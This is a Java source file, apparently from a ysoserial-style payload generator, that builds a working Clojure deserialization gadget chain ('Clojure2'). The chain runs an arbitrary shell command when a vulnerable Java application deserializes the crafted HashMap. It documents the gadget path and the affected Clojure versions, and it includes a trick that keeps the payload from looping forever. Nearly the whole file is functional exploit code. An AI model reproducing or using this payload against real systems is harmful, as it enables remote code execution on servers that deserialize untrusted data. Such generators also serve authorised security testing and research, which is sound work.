package com.ppp.chain.clojure;

import clojure.lang.Iterate;
import com.ppp.KickOff;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.RanDomUtils;
import com.ppp.utils.Reflections;
import com.ppp.utils.Strings;

import java.util.Arrays;

/*
	Gadget chain:
		ObjectInputStream.readObject()
			HashMap.readObject()
				clojure.lang.ASeq.hashCode()
					clojure.lang.Iterate.first() -> null
					clojure.lang.Iterate.next()  -> new Iterate(f, null, UNREALIZED_SEED)
					clojure.lang.Iterate.first() -> this.f.invoke(null)
						clojure.core$constantly$fn__4614.invoke()
						clojure.main$eval_opt.invoke()

	Requires:
		org.clojure:clojure
		Versions since 1.8.0 are vulnerable; for earlier versions see Clojure.java.
		  Versions up to 1.10.0-alpha4 are known to be vulnerable.
 */
@Dependencies({"org.clojure:clojure:<=1.8.0"})
@Authors({Authors.JACKOFMOSTTRADES})
@Sink({Sink.Default})
public class Clojure2 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(Clojure2.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        String command = sinksHelper.getCommand();

        Object kickOffObject = getChain(command);

        return kickOffObject;
    }

    public Object getChain(String command) throws Exception {
        String s = RanDomUtils.generateRandomString(3);
        String cmd = Strings.join(Arrays.asList(command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\").split(" ")), " ", "\"", "\"");

        final String clojurePayload =
                String.format("(use '[clojure.java.shell :only [sh]]) (sh %s)", cmd);

        Iterate model = Reflections.createWithoutConstructor(Iterate.class);
        Object evilFn =
                new clojure.core$comp().invoke(
                        new clojure.main$eval_opt(),
                        new clojure.core$constantly().invoke(clojurePayload));

        // Wrap the evil function with a composition that invokes the payload, then throws an exception. Otherwise Iterable()
        // ends up triggering the payload in an infinite loop as it tries to compute the hashCode.
        evilFn = new clojure.core$comp().invoke(
                new clojure.main$eval_opt(),
                new clojure.core$constantly().invoke(String.format("(throw (Exception. \"%s\"))", s)),
                evilFn);

        Reflections.setFieldValue(model, "f", evilFn);
        return KickOff.makeMap(model, null);
    }
}
